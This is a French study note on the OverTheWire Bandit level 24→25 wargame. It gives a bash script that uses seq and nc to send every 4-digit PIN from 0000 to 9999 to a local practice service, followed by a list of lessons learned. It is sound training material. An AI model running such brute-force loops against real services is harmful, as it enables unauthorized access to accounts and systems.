# Bandit Level 24 → 25

## Objectif
Trouver un code PIN à 4 chiffres par brute force.

## Commandes utilisées
mkdir /tmp/b25 && cd /tmp/b25
cat > brute.sh << 'EOF'
#!/bin/bash
for i in $(seq -w 0000 9999); do
    echo "mot_de_passe $i"
done | nc localhost 30002 | grep -v Wrong
EOF
chmod +x brute.sh && ./brute.sh

## Ce que j'ai appris
- Le brute force teste toutes les combinaisons possibles
- seq -w génère des nombres avec zéros (0000-9999)
- nc envoie toutes les combinaisons au service
- grep -v Wrong filtre les mauvaises réponses
- Concept clé : brute force de PIN codes
